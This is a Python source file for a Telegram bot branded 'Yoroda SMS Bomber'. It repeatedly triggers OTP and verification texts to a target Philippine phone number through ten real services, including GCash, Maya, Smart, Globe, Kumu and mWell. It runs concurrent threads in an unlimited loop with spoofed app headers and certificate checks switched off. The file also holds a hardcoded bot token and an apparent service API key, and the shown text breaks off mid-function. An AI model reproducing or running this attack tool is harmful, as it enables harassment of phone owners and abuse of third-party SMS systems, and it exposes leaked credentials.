import asyncio
import sys

# ============================================================
# FIX FOR PYTHON 3.14 EVENT LOOP ISSUE
# ============================================================
if sys.version_info >= (3, 14):
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

import re
import random
import string
import hashlib
import requests
import time
import json
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import threading
import warnings
import urllib3

# ============================================================
# FLASK WEB SERVER FOR UPTIME ROBOT
# ============================================================
from flask import Flask, jsonify

flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Yoroda SMS Bomber Bot</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #0a0a0a; color: #00ff00; }
                h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
                .status { font-size: 24px; margin: 20px 0; }
                .green { color: #00ff00; }
                .info { color: #ffffff; font-size: 16px; }
                .container { background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #00ff00; max-width: 600px; margin: 0 auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 YORODA SMS BOMBER</h1>
                <div class="status green">✅ Bot is RUNNING</div>
                <div class="info">📱 Services: 10 Active</div>
                <div class="info">⚡ Mode: Unlimited</div>
                <div class="info">👤 Author: Yoroda Hamada</div>
                <div class="info" style="margin-top:20px;font-size:14px;color:#888;">
                    Uptime Robot Monitor Active
                </div>
            </div>
        </body>
    </html>
    """

@flask_app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "bot": "running",
        "services": 10,
        "mode": "unlimited",
        "timestamp": time.time()
    })

@flask_app.route('/status')
def status():
    return jsonify({
        "status": "running" if bot.bomber.is_running else "idle",
        "target": bot.bomber.current_target or "None",
        "success": bot.bomber.success_count,
        "failed": bot.bomber.fail_count,
        "total": bot.bomber.total_attempts,
        "services": len(bot.bomber.services)
    })

def run_web_server():
    """Run Flask web server for Uptime Robot"""
    port = int(os.environ.get('PORT', 10000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# DISABLE WARNINGS
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# BOT TOKEN
# ============================================================
BOT_TOKEN = "8824864653:AAEmpXwgdiGLKqLq_VjiIcuvRbfFvcNbDHY"

# ============================================================
# SMS BOMBER CLASS - UNLIMITED WITH CUSTOM MESSAGE
# ============================================================

class YorodaBomber:
    def __init__(self):
        self.session = requests.Session()
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.is_running = False
        self.current_target = ""
        self.current_batches = 0
        self.start_time = None
        self.services_used = []
        self.batch_results = []
        self.custom_message = ""
        
        # 10 ACTIVE SERVICES
        self.services = [
            ("XPRESS", self.xpress_attack),
            ("BISTRO", self.bistro_attack),
            ("KUMU", self.kumu_attack),
            ("MWELL", self.mwell_attack),
            ("PEXX", self.pexx_attack),
            ("GCASH", self.gcash_attack),
            ("MAYA", self.maya_attack),
            ("SMART", self.smart_attack),
            ("GLOBE", self.globe_attack),
            ("TNT", self.tnt_attack)
        ]

    def format_phone(self, phone):
        phone = str(phone).strip()
        phone = re.sub(r'[\s\-+()]', '', phone)
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone

    def validate_phone(self, phone):
        clean = self.format_phone(phone)
        return bool(re.match(r'^9\d{9}$', clean))

    def random_string(self, length=16):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    # ============== ATTACK METHODS ==============
    
    def xpress_attack(self, phone, index=1):
        try:
            formatted = self.format_phone(phone)
            timestamp = int(time.time())
            headers = {
                "User-Agent": "Dalvik/2.1.0",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Connection": "close"
            }
            data = {
                "FirstName": f"User{timestamp}_{index}",
                "LastName": "Test",
                "Email": f"user{timestamp}_{index}@gmail.com",
                "Phone": f"+63{formatted}",
                "Password": f"Pass{random.randint(1000,9999)}",
                "ConfirmPassword": f"Pass{random.randint(1000,9999)}"
            }
            response = requests.post(
                "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def bistro_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 16)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Connection': 'close'
            }
            url = f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}"
            response = requests.get(
                url,
                headers=headers,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                try:
                    result = response.json()
                    if result.get('isSuccessful'):
                        return True, "OTP sent"
                except:
                    return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def kumu_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            timestamp = int(time.time())
            random_str = self.random_string(32)
            signature = hashlib.sha256(
                f"{timestamp}{random_str}{formatted}kumu_secret_2024".encode()
            ).hexdigest()
            
            headers = {
                'User-Agent': 'okhttp/5.0.0-alpha.14',
                'Content-Type': 'application/json',
                'Device-Type': 'android',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "country_code": "+63",
                "encrypt_rnd_string": random_str,
                "cellphone": formatted,
                "encrypt_signature": signature,
                "encrypt_timestamp": timestamp
            }
            response = requests.post(
                "https://api.kumuapi.com/v2/user/sendverifysms",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                try:
                    result = response.json()
                    if result.get('code') in [200, 403]:
                        return True, "OTP sent"
                except:
                    return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def mwell_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-device-type': 'android',
                'x-request-id': self.random_string(16),
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "country": "PH",
                "phoneNumber": formatted,
                "phoneNumberPrefix": "+63"
            }
            response = requests.post(
                "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                try:
                    result = response.json()
                    if result.get('c') == 200:
                        return True, "OTP sent"
                except:
                    return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def pexx_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'appversion': '3.0.14',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "0": {
                    "json": {
                        "email": "",
                        "areaCode": "+63",
                        "phone": f"+63{formatted}",
                        "otpChannel": "TG",
                        "otpUsage": "REGISTRATION"
                    }
                }
            }
            response = requests.post(
                "https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                try:
                    result = response.json()
                    if isinstance(result, list) and len(result) > 0:
                        data = result[0].get('result', {}).get('data', {}).get('json', {})
                        if data.get('code') == 200:
                            return True, "OTP sent"
                except:
                    return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def gcash_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "mobileNumber": f"+63{formatted}",
                "channel": "SMS"
            }
            response = requests.post(
                "https://api.gcash.com/v1/otp/send",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def maya_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.10.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "msisdn": f"+63{formatted}",
                "type": "login"
            }
            response = requests.post(
                "https://api.maya.ph/v1/otp/request",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def smart_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "msisdn": f"+63{formatted}",
                "service": "otp"
            }
            response = requests.post(
                "https://api.smart.com.ph/v1/otp/send",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def globe_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.8.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "mobile": f"+63{formatted}",
                "type": "verification"
            }
            response = requests.post(
                "https://api.globe.com.ph/v1/otp/request",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def tnt_attack(self, phone):
        try:
            formatted = self.format_phone(phone)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Connection': 'close'
            }
            data = {
                "msisdn": f"+63{formatted}",
                "source": "tnt_app"
            }
            response = requests.post(
                "https://api.tnt.com.ph/v1/otp/send",
                headers=headers,
                json=data,
                timeout=8,
                verify=False
            )
            if response.status_code in [200, 201, 202]:
                return True, "OTP sent"
            return False, f"Code {response.status_code}"
        except:
            return False, "Error"

    def execute_attack_unlimited(self, phone, callback=None):
        formatted = self.format_phone(phone)
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.is_running = True
        self.current_target = phone
        self.start_time = time.time()
        self.batch_results = []
        
        batch = 0
        
        while self.is_running:
            batch += 1
            batch_success = 0
            batch_fail = 0
            batch_results = []
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {}
                for name, func in self.services:
                    if name == "XPRESS":
                        future = executor.submit(func, phone, batch)
                    else:
                        future = executor.submit(func, phone)
                    futures[future] = name
                
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    name = futures[future]
                    try:
                        success, message = future.result(timeout=8)
                        self.total_attempts += 1
                        
                        if success:
                            self.success_count += 1
                            batch_success += 1
                            batch_results.append(f"[SUCCESS] {name}")
                        else:
                            self.fail_count += 1
                            batch_fail += 1
                            batch_results.append(f"[FAILED] {name}")
                    except Exception as e:
                        self.fail_count += 1
                        batch_fail += 1
                        self.total_attempts += 1
                        batch_results.append(f"[FAILED] {name}")
            
            elapsed = time.time() - self.start_time
            speed = self.total_attempts / elapsed if elapsed > 0 else 0
            
            batch_data = {
                'batch': batch,
                'success': batch_success,
                'fail': batch_fail,
                'results': batch_results,
                'total_success': self.success_count,
                'total_fail': self.fail_count,
                'total_attempts': self.total_attempts,
                'speed': speed,
                'elapsed': elapsed,
                'services': len(self.services)
            }
            self.batch_results.append(batch_data)
            
            if callback:
                callback(batch_data)
            
            if self.is_running:
                time.sleep(random.uniform(0.3, 0.8))
        
        return self.success_count, self.fail_count, self.total_attempts

# ============================================================
# TELEGRAM BOT CLASS
# ============================================================

class TelegramBomberBot:
    def __init__(self):
        self.bomber = YorodaBomber()
        self.chat_id = None
        self.is_attacking = False
        self.target_number = ""
        self.custom_message = ""

bot = TelegramBomberBot()

# ============================================================
# TELEGRAM HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status = "RUNNING" if bot.bomber.is_running else "IDLE"
    
    keyboard = [
        [InlineKeyboardButton("START UNLIMITED ATTACK", callback_data="attack")],
        [InlineKeyboardButton("SET TARGET NUMBER", callback_data="set_target")],
        [InlineKeyboardButton("SET CUSTOM MESSAGE", callback_data="set_message")],
        [InlineKeyboardButton("LIVE STATUS", callback_data="status")],
        [InlineKeyboardButton("STATISTICS", callback_data="stats")],
        [InlineKeyboardButton("STOP ATTACK", callback_data="stop")],
        [InlineKeyboardButton("SERVICES", callback_data="services")],
        [InlineKeyboardButton("HELP", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    elapsed = time.time() - bot.bomber.start_time if bot.bomber.start_time else 0
    speed = bot.bomber.total_attempts / elapsed if elapsed > 0 else 0
    
    await update.message.reply_text(
        f"================================\n"
        f"  YORODA HAMADA "
        f"   SMS   SPAM EDITION\n"
        f"================================\n\n"
        f"STATUS: {status}\n"
        f"TARGET: {bot.bomber.current_target or 'None'}\n"
        f"SERVICES: {len(bot.bomber.services)}\n"
        f"SUCCESS: {bot.bomber.success_count}\n"
        f"FAILED: {bot.bomber.fail_count}\n"
        f"TOTAL: {bot.bomber.total_attempts}\n"
        f"SPEED: {speed:.1f} SMS/sec\n"
        f"ELAPSED: {int(elapsed)}s\n"
        f"CUSTOM MSG: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n\n"
        f"Press START to begin unlimited bombing!",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "attack":
        await attack_menu(query, context)
    elif query.data == "set_target":
        await set_target_menu(query, context)
    elif query.data == "set_message":
        await set_message_menu(query, context)
    elif query.data == "status":
        await live_status(query, context)
    elif query.data == "stats":
        await show_stats(query, context)
    elif query.data == "stop":
        await stop_attack(query, context)
    elif query.data == "services":
        await show_services(query, context)
    elif query.data == "help":
        await show_help(query, context)
    elif query.data == "back":
        await start(update, context)
    elif query.data.startswith("attack_"):
        parts = query.data.split("_")
        phone = parts[1]
        await execute_unlimited_attack(query, context, phone)
    elif query.data.startswith("msg_"):
        msg = query.data.replace("msg_", "").replace("_", " ")
        bot.bomber.custom_message = msg
        await query.edit_message_text(f"Custom message set: {msg}")
        await asyncio.sleep(1)
        await start(update, context)

async def attack_menu(query, context):
    if bot.bomber.is_running:
        await query.edit_message_text(
            "ATTACK IS ALREADY RUNNING!\n"
            f"Target: {bot.bomber.current_target}\n"
            "Use STOP ATTACK to stop first."
        )
        return
    
    if not bot.bomber.current_target:
        await query.edit_message_text(
            "NO TARGET SET!\n"
            "Use /target 09123456789 to set target."
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("START UNLIMITED ATTACK", callback_data=f"attack_{bot.bomber.current_target}")],
        [InlineKeyboardButton("BACK", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"================================\n"
        f"  UNLIMITED ATTACK\n"
        f"================================\n\n"
        f"Target: +63{bot.bomber.current_target}\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Mode: UNLIMITED\n"
        f"Custom Message: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n\n"
        f"Press START to begin!\n"
        f"Use STOP ATTACK to stop anytime.",
        reply_markup=reply_markup
    )

async def set_target_menu(query, context):
    await query.edit_message_text(
        "SET TARGET NUMBER\n"
        "================================\n\n"
        "Use the /target command:\n"
        "/target 09123456789\n\n"
        "Format: 09123456789 or 9123456789\n"
        "================================\n\n"
        "Press BACK to return.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("BACK", callback_data="back")]
        ])
    )

async def set_message_menu(query, context):
    await query.edit_message_text(
        "SET CUSTOM MESSAGE\n"
        "================================\n\n"
        "Use the /message command:\n"
        "/message Your custom text here\n\n"
        "Current message: {bot.bomber.custom_message or 'None'}\n"
        "================================\n\n"
        "Press BACK to return.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("BACK", callback_data="back")]
        ])
    )

async def execute_unlimited_attack(query, context, phone):
    if bot.bomber.is_running:
        await query.edit_message_text("Attack is already running! Use STOP ATTACK to stop.")
        return
    
    if not bot.bomber.validate_phone(phone):
        await query.edit_message_text(
            "INVALID PHONE NUMBER!\n"
            "Use format: 09123456789 or 9123456789"
        )
        return
    
    formatted = bot.bomber.format_phone(phone)
    bot.bomber.current_target = formatted
    bot.chat_id = query.message.chat_id
    
    msg_text = bot.bomber.custom_message if bot.bomber.custom_message else "OTP sent"
    
    await query.edit_message_text(
        f"UNLIMITED ATTACK STARTED!\n"
        f"================================\n"
        f"Target: +63{formatted}\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Mode: UNLIMITED\n"
        f"Custom MSG: {msg_text}\n"
        f"================================\n"
        f"Bombing in progress...\n"
        f"Use STOP ATTACK to stop anytime.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("STOP ATTACK", callback_data="stop")],
            [InlineKeyboardButton("LIVE STATUS", callback_data="status")]
        ])
    )
    
    def progress_callback(batch_data):
        try:
            results_text = "\n".join(batch_data['results'])
            
            status_msg = (
                f"================================\n"
                f"BATCH #{batch_data['batch']}\n"
                f"================================\n"
                f"Success: {batch_data['success']}\n"
                f"Failed: {batch_data['fail']}\n"
                f"================================\n"
                f"TOTAL STATS:\n"
                f"Sent: {batch_data['total_success']}\n"
                f"Failed: {batch_data['total_fail']}\n"
                f"Total: {batch_data['total_attempts']}\n"
                f"Speed: {batch_data['speed']:.1f} SMS/sec\n"
                f"Elapsed: {int(batch_data['elapsed'])}s\n"
                f"================================\n"
                f"{results_text}"
            )
            
            context.bot.send_message(bot.chat_id, status_msg)
        except:
            pass
    
    def done_callback(success, fail, total):
        try:
            context.bot.send_message(
                bot.chat_id,
                f"================================\n"
                f"ATTACK STOPPED\n"
                f"================================\n"
                f"Success: {success}\n"
                f"Failed: {fail}\n"
                f"Total: {total}\n"
                f"================================\n"
                f"Press START to begin again."
            )
        except:
            pass
    
    def run_attack():
        success, fail, total = bot.bomber.execute_attack_unlimited(phone, progress_callback)
        done_callback(success, fail, total)
    
    threading.Thread(target=run_attack).start()
    bot.is_attacking = True

async def live_status(query, context):
    elapsed = time.time() - bot.bomber.start_time if bot.bomber.start_time else 0
    speed = bot.bomber.total_attempts / elapsed if elapsed > 0 else 0
    status = "RUNNING" if bot.bomber.is_running else "IDLE"
    
    text = (
        f"================================\n"
        f"LIVE STATUS\n"
        f"================================\n"
        f"Status: {status}\n"
        f"Target: +63{bot.bomber.current_target or 'None'}\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Success: {bot.bomber.success_count}\n"
        f"Failed: {bot.bomber.fail_count}\n"
        f"Total: {bot.bomber.total_attempts}\n"
        f"Speed: {speed:.1f} SMS/sec\n"
        f"Elapsed: {int(elapsed)}s\n"
        f"Custom MSG: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n"
    )
    
    keyboard = [[InlineKeyboardButton("REFRESH", callback_data="status")]]
    if bot.bomber.is_running:
        keyboard.append([InlineKeyboardButton("STOP", callback_data="stop")])
    keyboard.append([InlineKeyboardButton("BACK", callback_data="back")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_stats(query, context):
    total = bot.bomber.success_count + bot.bomber.fail_count
    rate = (bot.bomber.success_count / total * 100) if total > 0 else 0
    elapsed = time.time() - bot.bomber.start_time if bot.bomber.start_time else 0
    speed = bot.bomber.total_attempts / elapsed if elapsed > 0 else 0
    
    text = (
        f"================================\n"
        f"ATTACK STATISTICS\n"
        f"================================\n"
        f"Target: +63{bot.bomber.current_target or 'None'}\n"
        f"Success: {bot.bomber.success_count}\n"
        f"Failed: {bot.bomber.fail_count}\n"
        f"Total: {total}\n"
        f"Rate: {rate:.1f}%\n"
        f"Speed: {speed:.1f} SMS/sec\n"
        f"Elapsed: {int(elapsed)}s\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Custom MSG: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n"
    )
    keyboard = [[InlineKeyboardButton("BACK", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def stop_attack(query, context):
    if bot.bomber.is_running:
        bot.bomber.is_running = False
        await query.edit_message_text(
            "ATTACK STOPPED!\n"
            "================================\n"
            f"Total Sent: {bot.bomber.success_count}\n"
            f"Total Failed: {bot.bomber.fail_count}\n"
            f"Total Attempts: {bot.bomber.total_attempts}\n"
            "================================\n"
            "Press START to begin again."
        )
    else:
        await query.edit_message_text("No attack is currently running.")
    await asyncio.sleep(1)
    await start(update_with_query(query), context)

async def show_services(query, context):
    text = f"================================\n"
    text += f"ACTIVE SERVICES\n"
    text += f"================================\n\n"
    
    services = [
        ("XPRESS", "Xpress PH", "ACTIVE"),
        ("BISTRO", "Bistro BFF", "ACTIVE"),
        ("KUMU", "Kumu App", "ACTIVE"),
        ("MWELL", "MWell Health", "ACTIVE"),
        ("PEXX", "Pexx App", "ACTIVE"),
        ("GCASH", "GCash", "ACTIVE"),
        ("MAYA", "Maya", "ACTIVE"),
        ("SMART", "Smart", "ACTIVE"),
        ("GLOBE", "Globe", "ACTIVE"),
        ("TNT", "TNT", "ACTIVE"),
    ]
    
    for name, desc, status in services:
        text += f"[{status}] {name} - {desc}\n"
    
    text += f"\n================================\n"
    text += f"Total: {len(services)} services"
    
    keyboard = [[InlineKeyboardButton("BACK", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_help(query, context):
    text = (
        f"================================\n"
        f"HELP - YORODA BOMBER\n"
        f"================================\n\n"
        f"COMMANDS:\n"
        f"/start - Show main menu\n"
        f"/target 09123456789 - Set target number\n"
        f"/message Your text - Set custom message\n"
        f"/attack - Start unlimited attack\n"
        f"/stop - Stop attack\n"
        f"/status - Live status\n"
        f"/stats - Show statistics\n"
        f"/services - Show services\n"
        f"/help - Show this\n\n"
        f"SERVICES (10):\n"
        f"XPRESS, BISTRO, KUMU, MWELL, PEXX\n"
        f"GCASH, MAYA, SMART, GLOBE, TNT\n\n"
        f"UNLIMITED MODE:\n"
        f"Runs continuously until stopped!\n"
        f"================================\n"
    )
    keyboard = [[InlineKeyboardButton("BACK", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

def update_with_query(query):
    class FakeUpdate:
        def __init__(self, query):
            self.message = type('obj', (object,), {
                'reply_text': lambda self, text, **kwargs: query.edit_message_text(text, **kwargs)
            })()
    return FakeUpdate(query)

# ============================================================
# COMMAND HANDLERS
# ============================================================

async def target_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "USAGE: /target 09123456789\n"
            "Set the target number for bombing"
        )
        return
    
    phone = context.args[0]
    if not bot.bomber.validate_phone(phone):
        await update.message.reply_text(
            "INVALID PHONE NUMBER!\n"
            "Use format: 09123456789 or 9123456789"
        )
        return
    
    formatted = bot.bomber.format_phone(phone)
    bot.bomber.current_target = formatted
    await update.message.reply_text(
        f"TARGET SET!\n"
        f"Target: +63{formatted}\n\n"
        f"Press /attack to start unlimited bombing!"
    )

async def message_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "USAGE: /message Your custom text here\n"
            "Set custom message for the attack"
        )
        return
    
    msg = " ".join(context.args)
    bot.bomber.custom_message = msg
    await update.message.reply_text(
        f"CUSTOM MESSAGE SET!\n"
        f"Message: {msg}\n\n"
        f"This will appear in the attack logs."
    )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot.bomber.is_running:
        await update.message.reply_text("Attack is already running! Use /stop to stop.")
        return
    
    if not bot.bomber.current_target:
        await update.message.reply_text(
            "NO TARGET SET!\n"
            "Use /target 09123456789 first."
        )
        return
    
    phone = bot.bomber.current_target
    
    query = type('obj', (object,), {
        'edit_message_text': update.message.reply_text,
        'answer': lambda self: None,
        'data': f"attack_{phone}",
        'message': type('obj', (object,), {'chat_id': update.message.chat_id})()
    })()
    await execute_unlimited_attack(query, context, phone)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    elapsed = time.time() - bot.bomber.start_time if bot.bomber.start_time else 0
    speed = bot.bomber.total_attempts / elapsed if elapsed > 0 else 0
    status = "RUNNING" if bot.bomber.is_running else "IDLE"
    
    text = (
        f"================================\n"
        f"LIVE STATUS\n"
        f"================================\n"
        f"Status: {status}\n"
        f"Target: +63{bot.bomber.current_target or 'None'}\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Success: {bot.bomber.success_count}\n"
        f"Failed: {bot.bomber.fail_count}\n"
        f"Total: {bot.bomber.total_attempts}\n"
        f"Speed: {speed:.1f} SMS/sec\n"
        f"Elapsed: {int(elapsed)}s\n"
        f"Custom MSG: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n"
    )
    await update.message.reply_text(text)

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total = bot.bomber.success_count + bot.bomber.fail_count
    rate = (bot.bomber.success_count / total * 100) if total > 0 else 0
    elapsed = time.time() - bot.bomber.start_time if bot.bomber.start_time else 0
    speed = bot.bomber.total_attempts / elapsed if elapsed > 0 else 0
    
    text = (
        f"================================\n"
        f"ATTACK STATISTICS\n"
        f"================================\n"
        f"Target: +63{bot.bomber.current_target or 'None'}\n"
        f"Success: {bot.bomber.success_count}\n"
        f"Failed: {bot.bomber.fail_count}\n"
        f"Total: {total}\n"
        f"Rate: {rate:.1f}%\n"
        f"Speed: {speed:.1f} SMS/sec\n"
        f"Elapsed: {int(elapsed)}s\n"
        f"Services: {len(bot.bomber.services)}\n"
        f"Custom MSG: {bot.bomber.custom_message or 'None'}\n"
        f"================================\n"
    )
    await update.message.reply_text(text)

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot.bomber.is_running:
        bot.bomber.is_running = False
        await update.message.reply_text(
            f"ATTACK STOPPED!\n"
            f"================================\n"
            f"Total Sent: {bot.bomber.success_count}\n"
            f"Total Failed: {bot.bomber.fail_count}\n"
            f"Total Attempts: {bot.bomber.total_attempts}\n"
            f"================================\n"
            f"Press /start to begin again."
        )
    else:
        await update.message.reply_text("No attack is currently running.")

async def services_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"================================\n"
    text += f"ACTIVE SERVICES\n"
    text += f"================================\n\n"
    text += "[ACTIVE] XPRESS - Xpress PH\n"
    text += "[ACTIVE] BISTRO - Bistro BFF\n"
    text += "[ACTIVE] KUMU - Kumu App\n"
    text += "[ACTIVE] MWELL - MWell Health\n"
    text += "[ACTIVE] PEXX - Pexx App\n"
    text += "[ACTIVE] GCASH - GCash\n"
    text += "[ACTIVE] MAYA - Maya\n"
    text += "[ACTIVE] SMART - Smart\n"
    text += "[ACTIVE] GLOBE - Globe\n"
    text += "[ACTIVE] TNT - TNT\n"
    text += f"\n================================\n"
    text += f"Total: 10 services"
    await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"================================\n"
        f"HELP - YORODA BOMBER\n"
        f"================================\n\n"
        f"COMMANDS:\n"
        f"/start - Show main menu\n"
        f"/target 09123456789 - Set target number\n"
        f"/message Your text - Set custom message\n"
        f"/attack - Start unlimited attack\n"
        f"/stop - Stop attack\n"
        f"/status - Live status\n"
        f"/stats - Show statistics\n"
        f"/services - Show services\n"
        f"/help - Show this\n\n"
        f"SERVICES (10):\n"
        f"XPRESS, BISTRO, KUMU, MWELL, PEXX\n"
        f"GCASH, MAYA, SMART, GLOBE, TNT\n\n"
        f"UNLIMITED MODE:\n"
        f"Runs continuously until stopped!\n"
        f"================================\n"
    )
    await update.message.reply_text(text)

# ============================================================
# MAIN
# ============================================================

def main():
    print("""
    =================================
      YORODA SMS BOMBER
      UNLIMITED EDITION
    =================================
      Services: 10 ACTIVE
      Mode: UNLIMITED
      Status: RUNNING
      Author: Yoroda Hamada
    =================================
    """)
    
    # Start Flask web server for Uptime Robot
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    print("✅ Web server started for Uptime Robot monitoring")
    
    # Fix for Python 3.14 - ensure event loop exists
    if sys.version_info >= (3, 14):
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("target", target_cmd))
    app.add_handler(CommandHandler("message", message_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("services", services_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    
    # Callback query handler
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Bot is ready! Press Ctrl+C to stop.")
    print(f"🌐 Web server running on port {os.environ.get('PORT', 10000)}")
    
    if sys.version_info >= (3, 14):
        try:
            loop = asyncio.get_running_loop()
